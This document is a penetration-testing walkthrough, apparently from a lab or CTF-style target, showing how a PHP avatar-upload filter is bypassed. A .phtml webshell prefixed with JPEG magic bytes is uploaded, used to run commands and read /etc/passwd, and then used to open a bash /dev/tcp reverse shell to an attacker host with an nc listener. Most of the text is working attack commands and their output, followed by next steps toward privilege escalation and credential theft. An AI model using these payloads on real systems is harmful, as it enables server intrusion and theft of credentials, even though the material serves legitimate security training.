# File Upload Bypass to Webshell RCE

## Scenario
Web application with profile image upload feature, PHP backend.

## Step 1: Test Upload Restrictions
```bash
# Try direct PHP upload
$ curl -F "avatar=@webshell.php" http://10.10.10.75/upload.php
{"error": "File type not allowed. Only images (jpg, png, gif) are accepted."}

# Try double extension
$ cp webshell.php webshell.php.jpg
$ curl -F "avatar=@webshell.php.jpg" http://10.10.10.75/upload.php
{"error": "File type not allowed."}

# Try Content-Type bypass
$ curl -F "avatar=@webshell.php;type=image/jpeg" http://10.10.10.75/upload.php
{"error": "File type not allowed."}
```

## Step 2: Bypass with Magic Bytes + .phtml Extension
```bash
# Create PHP webshell with JPEG magic bytes
$ printf '\xFF\xD8\xFF\xE0' > shell.phtml
$ echo '<?php system($_GET["c"]); ?>' >> shell.phtml
$ file shell.phtml
shell.phtml: JPEG image data

# Upload with .phtml extension
$ curl -F "avatar=@shell.phtml;type=image/jpeg" http://10.10.10.75/upload.php
{"success": true, "path": "/uploads/avatar_a8f3b2c1.phtml"}
```

## Step 3: Execute Commands
```bash
$ curl -s "http://10.10.10.75/uploads/avatar_a8f3b2c1.phtml?c=id"
ÿØÿà
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl -s "http://10.10.10.75/uploads/avatar_a8f3b2c1.phtml?c=whoami"
ÿØÿà
www-data

$ curl -s "http://10.10.10.75/uploads/avatar_a8f3b2c1.phtml?c=cat+/etc/passwd" | tail -5
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/bash
admin:x:1002:1002::/home/admin:/bin/bash
```

## Step 4: Reverse Shell
```bash
# URL-encode the reverse shell payload
$ curl -s "http://10.10.10.75/uploads/avatar_a8f3b2c1.phtml?c=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261'"

# Attacker listener:
$ nc -lvnp 4444
Connection from 10.10.10.75:39812
www-data@target:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Bypass Techniques Tried
| Technique | Result |
|-----------|--------|
| Direct .php upload | ❌ Blocked by extension filter |
| .php.jpg double extension | ❌ Blocked |
| Content-Type: image/jpeg | ❌ Blocked (server checks extension) |
| .phtml + JPEG magic bytes | ✅ Bypassed both checks |

## Evidence
- Upload filter bypassed using .phtml extension + JPEG magic bytes
- RCE confirmed as www-data on Ubuntu target
- Users `deploy` and `admin` have shell access

## Next Steps
→ **privilege_escalation skill**: Check sudo -l, SUID binaries, capabilities
→ **credential_access skill**: Check /home/deploy and /home/admin for credentials
→ **discovery skill**: Full system enumeration from www-data shell
